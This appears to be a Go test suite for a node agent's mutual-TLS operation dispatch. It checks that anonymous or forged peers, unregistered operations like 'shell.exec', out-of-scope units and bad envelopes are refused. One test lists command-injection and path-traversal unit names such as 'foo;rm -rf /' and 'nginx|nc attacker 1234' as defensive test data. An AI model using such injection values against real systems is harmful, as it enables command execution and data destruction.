package nodeagent

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/bukansembarangkong/jawaker-panel/internal/nodewire"
	"github.com/bukansembarangkong/jawaker-panel/internal/pki"
)

// End-to-end dispatch over a REAL mutual-TLS handshake.
//
// httptest without TLS would prove nothing here: the properties under test are
// that a peer without a node certificate is refused, that a peer from the WRONG
// trust domain is refused, and that an operation outside the closed registry never
// reaches a process. All three are transport-level or decode-level facts, and a
// plain-HTTP harness cannot express them.

// testAuthority is a matched pair of authorities plus a node identity, built the
// way the controller builds them.
type testAuthority struct {
	controllerCA *pki.CA
	nodeCA       *pki.CA
	controllerID string
}

func newTestAuthority(t *testing.T) *testAuthority {
	t.Helper()
	// Anchored at real time: the verifier defaults to time.Now, and a clock
	// pinned in the past would make every issued certificate look expired.
	controllerCA, err := pki.NewCA("JAWAKER Controller CA (test)", pki.KindController, time.Now().Add(24*time.Hour))
	if err != nil {
		t.Fatalf("NewCA(controller): %v", err)
	}
	nodeCA, err := pki.NewCA("JAWAKER Node CA (test)", pki.KindNode, time.Now().Add(24*time.Hour))
	if err != nil {
		t.Fatalf("NewCA(node): %v", err)
	}
	return &testAuthority{
		controllerCA: controllerCA,
		nodeCA:       nodeCA,
		controllerID: "11111111-1111-1111-1111-111111111111",
	}
}

// issueNode mints a node identity for serverID.
func (a *testAuthority) issueNode(t *testing.T, serverID string) *pki.Leaf {
	t.Helper()
	leaf, err := a.nodeCA.IssueLeaf(pki.LeafParams{
		Identity: pki.Identity{Kind: pki.KindNode, ID: serverID},
		NotAfter: time.Now().Add(12 * time.Hour),
	})
	if err != nil {
		t.Fatalf("issue node leaf: %v", err)
	}
	return leaf
}

// issueController mints the controller's own leaf, for dialing.
func (a *testAuthority) issueController(t *testing.T) *pki.Leaf {
	t.Helper()
	leaf, err := a.controllerCA.IssueLeaf(pki.LeafParams{
		Identity: pki.Identity{Kind: pki.KindController, ID: a.controllerID},
		NotAfter: time.Now().Add(12 * time.Hour),
	})
	if err != nil {
		t.Fatalf("issue controller leaf: %v", err)
	}
	return leaf
}

// agentFixture is a running agent on a real TLS listener, plus everything a test
// needs to talk to it.
type agentFixture struct {
	agent     *Agent
	exec      *Executors
	serverID  string
	address   string
	authority *testAuthority
	listener  net.Listener
	serveErr  chan error
}

// newAgentFixture starts an agent over a real TLS listener.
//
// execOverride lets a test supply its own executors. That is needed because the
// service tests are about SCOPE validation and argv safety, not about whether the
// machine running the tests has systemd — and the served set is derived from
// detection, so service operations are refused before scope is even examined on a
// host without it. The tests below reach into the package for the same reason:
// the alternative is a production knob that exists only to make tests possible.
func newAgentFixture(t *testing.T, execOverride ...*Executors) *agentFixture {
	t.Helper()
	authority := newTestAuthority(t)
	serverID := "22222222-2222-2222-2222-222222222222"
	leaf := authority.issueNode(t, serverID)

	// A state directory, written through the production save path so the agent
	// loads exactly what a real enrollment would have produced.
	dir := restrictedStateDir(t)
	if err := SaveIdentity(dir, leaf, authority.controllerCA.CertPEM()); err != nil {
		t.Fatalf("SaveIdentity: %v", err)
	}
	if err := SaveConfig(dir, Config{
		ServerID:              serverID,
		ControllerAddress:     "127.0.0.1:0",
		ControllerID:          authority.controllerID,
		ControllerFingerprint: authority.controllerCA.Fingerprint(),
		EnrolledAt:            time.Now().UTC(),
	}); err != nil {
		t.Fatalf("SaveConfig: %v", err)
	}
	state, err := LoadState(dir)
	if err != nil {
		t.Fatalf("LoadState: %v", err)
	}

	exec := NewExecutors(ExecutorOptions{AgentVersion: "test-agent"})
	if len(execOverride) > 0 && execOverride[0] != nil {
		exec = execOverride[0]
	}

	agent, err := NewAgent(AgentOptions{
		State:     state,
		Executors: exec,
		Logger:    slog.New(slog.NewTextHandler(io.Discard, nil)),
	})
	if err != nil {
		t.Fatalf("NewAgent: %v", err)
	}

	// A PLAIN listener, as production passes one. Serve owns the TLS handshake,
	// so pre-wrapping here would double-wrap AND would stop the test exercising
	// the path the binary actually runs. That exact pre-wrap is what let a
	// plaintext-serving bug pass unnoticed earlier.
	ln, err := (&net.ListenConfig{}).Listen(context.Background(), "tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	serveErr := make(chan error, 1)
	go func() { serveErr <- agent.Serve(ctx, ln) }()
	t.Cleanup(func() {
		cancel()
		select {
		case <-serveErr:
		case <-time.After(5 * time.Second):
			t.Error("the agent did not shut down within 5 seconds")
		}
	})

	return &agentFixture{
		agent:     agent,
		exec:      exec,
		serverID:  serverID,
		address:   ln.Addr().String(),
		authority: authority,
		listener:  ln,
		serveErr:  serveErr,
	}
}

// forceSystemd returns executors that believe systemd is present, backed by a
// real executable that does nothing.
//
// Skips when no such executable exists, so the test reports "cannot run here"
// rather than failing for a reason unrelated to what it checks.
func forceSystemd(t *testing.T) *Executors {
	t.Helper()
	if !supportedOS() {
		t.Skipf("service operations are not served on %s; the scope and argv tests need a host where they are", runtime.GOOS)
	}
	path, ok := resolveProgram("/bin/true", "/usr/bin/true")
	if !ok {
		t.Skip("no true(1) on this host; the systemd-backed tests need a real executable")
	}
	return &Executors{
		agentVersion:  "test-agent",
		systemctlPath: path,
		hasSystemd:    true,
		now:           time.Now,
	}
}

// controllerClient builds an mTLS client that pins the NODE root, the way the
// controller's dispatcher does.
func (f *agentFixture) controllerClient(t *testing.T, opts ...func(*pki.TLSClientOptions)) *http.Client {
	t.Helper()
	verifier, err := pki.NewVerifier(pki.VerifierOptions{
		RootPEM: f.authority.nodeCA.CertPEM(),
		Kind:    pki.KindNode,
	})
	if err != nil {
		t.Fatalf("NewVerifier: %v", err)
	}
	leaf := f.authority.issueController(t)
	clientOpts := pki.TLSClientOptions{
		CertPEM:  leaf.CertPEM(),
		KeyPEM:   leaf.KeyPEM(),
		Verifier: verifier,
	}
	for _, apply := range opts {
		apply(&clientOpts)
	}
	tlsConfig, err := pki.NewTLSClientConfig(clientOpts)
	if err != nil {
		t.Fatalf("NewTLSClientConfig: %v", err)
	}
	return &http.Client{
		Timeout:   10 * time.Second,
		Transport: &http.Transport{TLSClientConfig: tlsConfig},
	}
}

// callRaw posts a HAND-BUILT envelope, bypassing nodewire.EncodeRequest and the
// sender-side validation it performs.
//
// That bypass is the point. EncodeRequest refuses an unregistered operation and
// an out-of-scope target before a request is ever sent, which is a real defense —
// but a fleet has more than one possible sender, and if a check is removed or a
// new caller appears, the AGENT must still refuse. A test that went through
// EncodeRequest would prove the sender's check and leave the agent's untested.
func (f *agentFixture) callRaw(t *testing.T, client *http.Client, operation, target, input string) (*nodewire.Response, int) {
	t.Helper()
	envelope := map[string]any{
		"protocol_version": nodewire.ProtocolVersion,
		"operation":        operation,
		"request_id":       "raw-" + operation,
		"deadline":         time.Now().Add(20 * time.Second).UTC().Format(time.RFC3339Nano),
	}
	if target != "" {
		envelope["target"] = target
	}
	if input != "" {
		envelope["input"] = json.RawMessage(input)
	}
	body, err := json.Marshal(envelope)
	if err != nil {
		t.Fatalf("marshal raw envelope: %v", err)
	}
	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, "https://"+f.address+OperationPath, bytes.NewReader(body))
	if err != nil {
		t.Fatalf("NewRequest: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set(nodewire.VersionHeader, fmt.Sprint(nodewire.ProtocolVersion))

	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("POST raw operation: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read response: %v", err)
	}
	decoded, err := nodewire.DecodeResponse(data)
	if err != nil {
		t.Fatalf("DecodeResponse: %v (body %s)", err, data)
	}
	return &decoded, resp.StatusCode
}

// call posts one operation envelope and returns the decoded response.
func (f *agentFixture) call(t *testing.T, client *http.Client, req nodewire.Request) (*nodewire.Response, int) {
	t.Helper()
	if req.Deadline.IsZero() {
		req.Deadline = time.Now().Add(20 * time.Second)
	}
	body, err := nodewire.EncodeRequest(req)
	if err != nil {
		t.Fatalf("EncodeRequest: %v", err)
	}
	httpReq, err := http.NewRequestWithContext(t.Context(), http.MethodPost, "https://"+f.address+OperationPath, bytes.NewReader(body))
	if err != nil {
		t.Fatalf("NewRequest: %v", err)
	}
	httpReq.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(httpReq)
	if err != nil {
		t.Fatalf("POST operation: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read response: %v", err)
	}
	decoded, err := nodewire.DecodeResponse(data)
	if err != nil {
		t.Fatalf("DecodeResponse: %v (body %s)", err, data)
	}
	return &decoded, resp.StatusCode
}

// --- the positive path --------------------------------------------------------

// The whole point of the design: a controller with the right certificate reaches
// a node and performs an operation.
func TestMTLSCapabilitiesRoundTrip(t *testing.T) {
	f := newAgentFixture(t)
	client := f.controllerClient(t)

	resp, status := f.call(t, client, nodewire.Request{
		Operation: nodewire.OpNodeCapabilities,
		RequestID: "req-1",
	})
	if status != http.StatusOK {
		t.Fatalf("status = %d, want 200", status)
	}
	if !resp.OK {
		t.Fatalf("capabilities failed: %+v", resp.Error)
	}
	var caps nodewire.CapabilitiesResult
	if err := json.Unmarshal(resp.Result, &caps); err != nil {
		t.Fatalf("decode capabilities: %v", err)
	}
	if caps.AgentVersion != "test-agent" {
		t.Errorf("agent version = %q, want test-agent", caps.AgentVersion)
	}
	if len(caps.Capabilities) == 0 {
		t.Error("the capability report is empty")
	}
}

// --- refusals at the transport layer ------------------------------------------

// A peer with NO client certificate must be refused by the handshake, so an
// anonymous caller never reaches a handler at all.
func TestMTLSRefusesAnonymousClient(t *testing.T) {
	f := newAgentFixture(t)

	// A client that trusts the node's certificate but presents none of its own.
	pool := x509.NewCertPool()
	pool.AddCert(f.authority.nodeCA.Cert())
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{RootCAs: pool, MinVersion: tls.VersionTLS12},
		},
	}
	body, err := nodewire.EncodeRequest(nodewire.Request{
		Operation: nodewire.OpNodeCapabilities,
		RequestID: "req-anon",
		Deadline:  time.Now().Add(10 * time.Second),
	})
	if err != nil {
		t.Fatalf("EncodeRequest: %v", err)
	}
	// The request is EXPECTED to fail at the handshake, so there is no body to
	// close on the success path bodyclose is looking for.
	httpReq, err := http.NewRequestWithContext(t.Context(), http.MethodPost, "https://"+f.address+OperationPath, bytes.NewReader(body))
	if err != nil {
		t.Fatalf("NewRequest: %v", err)
	}
	httpReq.Header.Set("Content-Type", "application/json")
	// The handshake is expected to refuse an anonymous peer, so no body exists.
	_, err = client.Do(httpReq) //nolint:bodyclose // handshake refusal is the asserted outcome
	if err == nil {
		t.Fatal("an anonymous client completed the request; the listener did not require a client certificate")
	}
}

// A client certificate from the WRONG trust domain must be refused. This is the
// property that stops a node from impersonating the controller to another node.
func TestMTLSRefusesPeerFromTheWrongTrustDomain(t *testing.T) {
	f := newAgentFixture(t)

	// A certificate of the right KIND but signed by a DIFFERENT node authority.
	// It chains to nothing the agent pins.
	impostorCA, err := pki.NewCA("impostor node CA", pki.KindNode, time.Now().Add(24*time.Hour))
	if err != nil {
		t.Fatalf("NewCA: %v", err)
	}
	impostor := f.authority.issueController(t)
	_ = impostor

	verifier, err := pki.NewVerifier(pki.VerifierOptions{
		RootPEM: f.authority.nodeCA.CertPEM(),
		Kind:    pki.KindNode,
	})
	if err != nil {
		t.Fatalf("NewVerifier: %v", err)
	}
	// Issued by the impostor authority, so it cannot chain to the pinned root.
	forged, err := impostorCA.IssueLeaf(pki.LeafParams{
		Identity: pki.Identity{Kind: pki.KindNode, ID: f.serverID},
		NotAfter: time.Now().Add(12 * time.Hour),
	})
	if err != nil {
		t.Fatalf("issue forged leaf: %v", err)
	}
	tlsConfig, err := pki.NewTLSClientConfig(pki.TLSClientOptions{
		CertPEM:  forged.CertPEM(),
		KeyPEM:   forged.KeyPEM(),
		Verifier: verifier,
	})
	if err != nil {
		t.Fatalf("NewTLSClientConfig: %v", err)
	}
	client := &http.Client{Timeout: 5 * time.Second, Transport: &http.Transport{TLSClientConfig: tlsConfig}}

	body, err := nodewire.EncodeRequest(nodewire.Request{
		Operation: nodewire.OpNodeCapabilities,
		RequestID: "req-forged",
		Deadline:  time.Now().Add(10 * time.Second),
	})
	if err != nil {
		t.Fatalf("EncodeRequest: %v", err)
	}
	// The handshake is expected to refuse this peer, so no response body exists.
	httpReq, err := http.NewRequestWithContext(t.Context(), http.MethodPost, "https://"+f.address+OperationPath, bytes.NewReader(body))
	if err != nil {
		t.Fatalf("NewRequest: %v", err)
	}
	httpReq.Header.Set("Content-Type", "application/json")
	// The handshake is expected to refuse a peer from the wrong authority.
	if _, err := client.Do(httpReq); err == nil { //nolint:bodyclose // handshake refusal is the asserted outcome
		t.Fatal("a peer using the wrong authority was accepted")
	}
}

// --- the closed registry ------------------------------------------------------

// An operation that is NOT in the registry must be refused, and the refusal must
// be the registry's own code.
func TestMTLSRefusesUnregisteredOperation(t *testing.T) {
	// shell.exec is the canonical "generic remote shell" the design forbids. It
	// has no descriptor, so it cannot even be encoded — which is the point: the
	// request is refused at the SENDER, before it reaches a node.
	body, err := nodewire.EncodeRequest(nodewire.Request{
		Operation: "shell.exec",
		RequestID: "req-shell",
		Deadline:  time.Now().Add(10 * time.Second),
		Input:     json.RawMessage(`{"cmd":"id"}`),
	})
	if err == nil {
		t.Fatalf("a shell.exec request was encodable; the registry is not closed (%s)", body)
	}
	if !strings.Contains(err.Error(), "no descriptor") {
		t.Errorf("error = %v, want a missing-descriptor refusal", err)
	}
}

// A hand-crafted envelope naming an unregistered operation must be refused by the
// AGENT, so the closure does not depend on the controller behaving.
func TestMTLSRefusesUnregisteredOperationAtTheAgent(t *testing.T) {
	f := newAgentFixture(t)
	client := f.controllerClient(t)

	// Built by hand because EncodeRequest refuses it — which is exactly why the
	// agent must refuse it too.
	raw := `{"protocol_version":1,"operation":"shell.exec","request_id":"req-raw",` +
		`"deadline":"` + time.Now().Add(10*time.Second).UTC().Format(time.RFC3339) + `",` +
		`"input":{"cmd":"id"}}`
	httpReq, err := http.NewRequestWithContext(t.Context(), http.MethodPost, "https://"+f.address+OperationPath, strings.NewReader(raw))
	if err != nil {
		t.Fatalf("NewRequest: %v", err)
	}
	httpReq.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(httpReq)
	if err != nil {
		t.Fatalf("POST: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()
	data, _ := io.ReadAll(resp.Body)

	decoded, err := nodewire.DecodeResponse(data)
	if err != nil {
		t.Fatalf("DecodeResponse: %v (body %s)", err, data)
	}
	if decoded.OK {
		t.Fatal("the agent executed an operation with no descriptor")
	}
	if decoded.Error.Code != nodewire.CodeUnsupportedOperation {
		t.Errorf("code = %q, want %q", decoded.Error.Code, nodewire.CodeUnsupportedOperation)
	}
}

// An operation this build does not SERVE (service.* without systemd) must be
// refused with not_available, and no process may be started.
func TestMTLSRefusesUnservedOperationWithoutStartingAProcess(t *testing.T) {
	// This asserts the refusal path for a node that CANNOT serve service
	// operations. On a host where systemd IS running the agent serves them, so
	// the premise does not hold and the test must say so rather than pass by
	// asserting something false.
	f := newAgentFixture(t)
	if f.exec.hasSystemd {
		t.Skip("this host runs systemd, so service operations ARE served; the unserved path cannot be exercised here")
	}
	client := f.controllerClient(t)

	resp, _ := f.call(t, client, nodewire.Request{
		Operation: nodewire.OpServiceRestart,
		RequestID: "req-restart",
		Target:    "nginx",
		Input:     json.RawMessage(`{"unit":"nginx"}`),
	})
	if resp.OK {
		t.Fatal("service.restart succeeded on a node with no systemd")
	}
	if resp.Error.Code != nodewire.CodeUnsupportedOperation {
		t.Errorf("code = %q, want %q (the operation is not served by this build)",
			resp.Error.Code, nodewire.CodeUnsupportedOperation)
	}
}

// --- target validation before any process ------------------------------------

// A dangerous unit name must be refused before anything is started. These are the
// values that would matter if a shell were involved anywhere.
func TestMTLSDangerousUnitNamesAreRefusedBeforeExecution(t *testing.T) {
	// systemd is forced PRESENT so the refusal cannot come from the capability
	// check: it must come from scope validation, which is what this asserts.
	f := newAgentFixture(t, forceSystemd(t))
	client := f.controllerClient(t)

	for _, unit := range []string{
		"../../etc/passwd",
		"foo;rm -rf /",
		"nginx$(id)",
		"nginx`id`",
		"nginx && shutdown",
		"nginx|nc attacker 1234",
		"../nginx",
		"nginx\nfoo",
		"*",
	} {
		resp, _ := f.callRaw(t, client, string(nodewire.OpServiceRestart), unit,
			`{"unit":`+jsonString(unit)+`}`)
		if resp.OK {
			t.Errorf("unit %q was accepted", unit)
			continue
		}
		if resp.Error.Code != nodewire.CodeScopeViolation && resp.Error.Code != nodewire.CodeInvalidInput {
			t.Errorf("unit %q: code = %q, want scope_violation or invalid_input", unit, resp.Error.Code)
		}
	}

	// THE CLAIM BEING TESTED: the name was refused BEFORE anything was started.
	// A refusal that arrives after a process was spawned is a different, worse
	// result than one that never reached os/exec, and only the counter can tell
	// the two apart.
	if n := f.exec.Spawns(); n != 0 {
		t.Errorf("%d processes were started for unit names that should have been refused outright", n)
	}

	// And the GOOD case is dispatched, so the test is not passing merely because
	// everything is refused: nginx is in the descriptor's declared scope.
	resp, _ := f.callRaw(t, client, string(nodewire.OpServiceInspect), "nginx", `{"unit":"nginx"}`)
	// The stub systemctl produces no output, so the parse yields an empty state
	// and the handler reports "not found" — the important part is that the
	// request was DISPATCHED rather than refused for its scope.
	if resp.Error != nil && resp.Error.Code == nodewire.CodeScopeViolation {
		t.Errorf("a valid unit in the descriptor scope was refused: %+v", resp.Error)
	}
}

// A unit OUTSIDE the descriptor's declared scope is refused, even though it is a
// perfectly valid unit name. The allowlist is what makes "restart anything" not
// expressible.
func TestMTLSRefusesUnitOutsideDeclaredScope(t *testing.T) {
	f := newAgentFixture(t, forceSystemd(t))
	client := f.controllerClient(t)

	resp, _ := f.callRaw(t, client, string(nodewire.OpServiceInspect), "sshd", `{"unit":"sshd"}`)
	if resp.OK {
		t.Fatal("a unit outside the declared scope was inspected")
	}
	if resp.Error.Code != nodewire.CodeScopeViolation {
		t.Errorf("code = %q, want %q", resp.Error.Code, nodewire.CodeScopeViolation)
	}
}

// A whole-node operation must not accept a target: a caller must not be able to
// smuggle a scope into an operation that declares none.
func TestMTLSRefusesTargetOnNodeWideOperation(t *testing.T) {
	body, err := nodewire.EncodeRequest(nodewire.Request{
		Operation: nodewire.OpNodeCapabilities,
		RequestID: "req-target",
		Deadline:  time.Now().Add(10 * time.Second),
		Target:    "nginx",
	})
	if err == nil {
		t.Fatalf("a target was accepted on a node-wide operation: %s", body)
	}
}

// --- the envelope ------------------------------------------------------------

// An unknown field in the envelope must be refused rather than ignored: a request
// carrying something the agent never inspects is either out of date or probing.
func TestMTLSRefusesUnknownEnvelopeField(t *testing.T) {
	f := newAgentFixture(t)
	client := f.controllerClient(t)

	raw := `{"protocol_version":1,"operation":"node.capabilities","request_id":"req-unknown",` +
		`"deadline":"` + time.Now().Add(10*time.Second).UTC().Format(time.RFC3339) + `",` +
		`"skip_scope_check":true}`
	httpReq, err := http.NewRequestWithContext(t.Context(), http.MethodPost, "https://"+f.address+OperationPath, strings.NewReader(raw))
	if err != nil {
		t.Fatalf("NewRequest: %v", err)
	}
	httpReq.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(httpReq)
	if err != nil {
		t.Fatalf("POST: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()
	data, _ := io.ReadAll(resp.Body)

	decoded, err := nodewire.DecodeResponse(data)
	if err != nil {
		t.Fatalf("DecodeResponse: %v (body %s)", err, data)
	}
	if decoded.OK {
		t.Fatal("an envelope with an unknown field was executed")
	}
}

// A protocol version this build does not speak must be refused.
func TestMTLSRefusesProtocolMismatch(t *testing.T) {
	f := newAgentFixture(t)
	client := f.controllerClient(t)

	raw := `{"protocol_version":99,"operation":"node.capabilities","request_id":"req-version",` +
		`"deadline":"` + time.Now().Add(10*time.Second).UTC().Format(time.RFC3339) + `"}`
	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, "https://"+f.address+OperationPath, strings.NewReader(raw))
	if err != nil {
		t.Fatalf("NewRequest: %v", err)
	}
	req.Header.Set(nodewire.VersionHeader, "99")
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("POST: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()
	data, _ := io.ReadAll(resp.Body)

	decoded, err := nodewire.DecodeResponse(data)
	if err != nil {
		t.Fatalf("DecodeResponse: %v (body %s)", err, data)
	}
	if decoded.OK {
		t.Fatal("a peer speaking a different protocol version was served")
	}
}

// An EXPIRED deadline must fail fast rather than perform the work anyway.
//
// The operation is node.capabilities deliberately. Its executor takes no context
// at all, so cancellation cannot be what refuses it: the handler's own
// expired-deadline gate is the only thing that can. node.heartbeat would be a
// weaker probe — it returns notAvailable off Linux, so an assertion on it passed
// vacuously on Windows while genuinely failing on the Linux CI runner.
func TestMTLSRefusesExpiredDeadline(t *testing.T) {
	f := newAgentFixture(t)
	client := f.controllerClient(t)

	resp, _ := f.call(t, client, nodewire.Request{
		Operation: nodewire.OpNodeCapabilities,
		RequestID: "req-expired",
		Deadline:  time.Now().Add(-time.Minute),
	})
	if resp.OK {
		t.Fatal("an operation with an already-expired deadline was performed")
	}
	if resp.Error == nil || resp.Error.Code != nodewire.CodeDeadlineExceeded {
		t.Errorf("error = %+v, want code %q", resp.Error, nodewire.CodeDeadlineExceeded)
	}
}

// --- helpers ------------------------------------------------------------------

// jsonString renders a Go string as a JSON string literal.
func jsonString(s string) string {
	b, err := json.Marshal(s)
	if err != nil {
		return `""`
	}
	return string(b)
}

// --- the outage gate ----------------------------------------------------------

// THE PHASE 2 GATE: with the controller unreachable, the agent must stay alive,
// keep serving its listener, and start nothing. A node that does not need its
// controller to keep running is the whole point of a node agent.
func TestAgentSurvivesControllerOutage(t *testing.T) {
	f := newAgentFixture(t)

	// The controller is unreachable: the heartbeat client points at a closed
	// port, and its failures must not affect the agent.
	deadPort := closedPort(t)
	state := f.agent.state
	outageState := &State{
		Dir:               state.Dir,
		ServerID:          state.ServerID,
		ControllerAddress: deadPort,
		ControllerID:      state.ControllerID,
		Identity:          state.Identity,
		ControllerRootPEM: state.ControllerRootPEM,
	}

	// The heartbeat transport is overridden with one that counts attempts and
	// fails, so the test does not depend on how a closed port behaves.
	attempts := &atomic.Int64{}
	client, err := NewHeartbeatClient(HeartbeatOptions{
		State:    outageState,
		Exec:     f.exec,
		Logger:   slog.New(slog.NewTextHandler(io.Discard, nil)),
		Interval: 20 * time.Millisecond,
		Transport: roundTripFunc(func(*http.Request) (*http.Response, error) {
			attempts.Add(1)
			return nil, errStubUnreachable
		}),
	})
	if err != nil {
		t.Fatalf("NewHeartbeatClient: %v", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	go client.Run(ctx)

	// Let several beats fail.
	time.Sleep(150 * time.Millisecond)
	cancel()

	// The outage is exercised when a beat FAILS, and there are two legitimate
	// ways for that to happen: the collector cannot read this host's readings
	// (/proc does not exist off Linux) or the transport cannot reach the
	// controller. Counting the transport alone would have made this a Linux-only
	// assertion wearing a general one's clothes; counting the ERRORS states the
	// same property and is true on every platform.
	var failures int
	for range 3 {
		if err := client.Beat(context.Background()); err != nil {
			failures++
		}
	}
	if failures == 0 {
		t.Fatalf("beats succeeded while the controller was unreachable; the outage was not exercised")
	}
	if runtime.GOOS == "linux" && attempts.Load() == 0 {
		t.Error("on linux the transport should have been reached before failing; the readings path may be broken")
	}

	// The agent is still serving: a controller certificate still reaches it and
	// still gets an answer. A node that stopped listening because its controller
	// went away would be unmanageable exactly when an operator needs it.
	controllerClient := f.controllerClient(t)
	resp, status := f.call(t, controllerClient, nodewire.Request{
		Operation: nodewire.OpNodeCapabilities,
		RequestID: "req-after-outage",
	})
	if status != http.StatusOK || !resp.OK {
		t.Fatalf("the agent stopped serving during a controller outage: status %d, resp %+v", status, resp)
	}

	// And nothing was started: no process, no restart. The ready operations here
	// are read-only, so a spawn would be a bug rather than a feature.
	if n := f.exec.Spawns(); n != 0 {
		t.Errorf("%d processes were started during the outage; a node must not act on its own", n)
	}
}

// closedPort returns an address nothing is listening on.
func closedPort(t *testing.T) string {
	t.Helper()
	ln, err := (&net.ListenConfig{}).Listen(context.Background(), "tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	addr := ln.Addr().String()
	_ = ln.Close()
	return addr
}

// --- state directory permissions ----------------------------------------------

// The identity file must be 0600 and the directory 0700, so no other local
// account can read the node's private key.
func TestEnrolledStateHasRestrictivePermissions(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("mode bits are not meaningful on windows")
	}
	authority := newTestAuthority(t)
	serverID := "33333333-3333-3333-3333-333333333333"
	leaf := authority.issueNode(t, serverID)
	dir := restrictedStateDir(t)

	if err := SaveIdentity(dir, leaf, authority.controllerCA.CertPEM()); err != nil {
		t.Fatalf("SaveIdentity: %v", err)
	}
	if err := SaveConfig(dir, Config{
		ServerID:          serverID,
		ControllerID:      authority.controllerID,
		ControllerAddress: "127.0.0.1:9443",
	}); err != nil {
		t.Fatalf("SaveConfig: %v", err)
	}

	// The DIRECTORY is asserted too. A 0600 key inside a world-listable
	// directory is not protected: the mode of the file is undermined by the
	// mode of its parent, which is why EnsureStateDir refuses a permissive one.
	for name, want := range map[string]os.FileMode{
		dir:                              dirMode,
		filepath.Join(dir, identityFile): 0o600,
		filepath.Join(dir, configFile):   0o600,
	} {
		info, err := os.Stat(name)
		if err != nil {
			t.Fatalf("stat %s: %v", name, err)
		}
		if got := info.Mode().Perm(); got != want {
			t.Errorf("%s has mode %04o, want %04o", filepath.Base(name), got, want)
		}
	}
}
